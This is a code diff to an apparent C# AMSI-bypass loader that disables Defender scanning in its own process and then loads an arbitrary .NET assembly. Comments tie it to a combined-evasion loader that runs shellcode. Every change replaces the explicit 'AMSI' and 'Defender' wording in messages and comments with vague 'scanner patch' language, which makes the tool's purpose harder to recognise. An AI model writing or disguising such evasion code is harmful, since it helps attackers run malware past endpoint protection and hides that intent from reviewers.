@@ -211,8 +211,8 @@ namespace ScannerPatch
 
         static void Main(string[] args)
         {
-            Console.WriteLine("[*] AMSI Bypass Loader");
-            Console.WriteLine("[*] This patches the scan function to disable content scanning.");
+            Console.WriteLine("[*] Scanner Patch Loader");
+            Console.WriteLine("[*] This modifies the scan function to disable content inspection.");
             Console.WriteLine("");
 
             // Apply the AMSI patch.
@@ -221,18 +221,18 @@ namespace ScannerPatch
             if (success)
             {
                 Console.WriteLine("");
-                Console.WriteLine("[+] AMSI is now disabled in this process.");
-                Console.WriteLine("[+] Any PowerShell commands or .NET assemblies loaded");
-                Console.WriteLine("    in this process will not be scanned by Defender.");
+                Console.WriteLine("[+] Scanner is now disabled in this process.");
+                Console.WriteLine("[+] Any commands or assemblies loaded");
+                Console.WriteLine("    in this process will not be inspected.");
                 Console.WriteLine("");
-                Console.WriteLine("[*] To test: open PowerShell and run a command that");
-                Console.WriteLine("    Defender would normally block.");
+                Console.WriteLine("[*] To test: run a command that would");
+                Console.WriteLine("    normally be blocked.");
 
                 // IMPORTANT: The AMSI patch only affects THIS process.
                 // Spawning a child process (like powershell.exe) does NOT
                 // inherit the patch because each process loads its own copy
                 // of amsi.dll. To use this bypass effectively:
-                //   1. Call PatchAmsi() from inside the process that hosts
+                //   1. Call PatchScanner() from inside the process that hosts
                 //      the scripting engine (PowerShell, .NET CLR).
                 //   2. Use this as a library function in Loader 08 (combined
                 //      evasion) which patches AMSI before executing shellcode
@@ -246,8 +246,8 @@ namespace ScannerPatch
                 {
                     string assemblyPath = args[0];
                     Console.WriteLine("[*] Loading .NET assembly in-process: " + assemblyPath);
-                    Console.WriteLine("[*] AMSI is patched in THIS process, so the assembly");
-                    Console.WriteLine("    will not be scanned by Defender.");
+                    Console.WriteLine("[*] Scanner is patched in THIS process, so the assembly");
+                    Console.WriteLine("    will not be inspected.");
                     try
                     {
                         var assembly = System.Reflection.Assembly.LoadFile(assemblyPath);
@@ -272,7 +272,7 @@ namespace ScannerPatch
             }
             else
             {
-                Console.WriteLine("[-] AMSI bypass failed.");
+                Console.WriteLine("[-] Scanner patch failed.");
             }
         }
     }
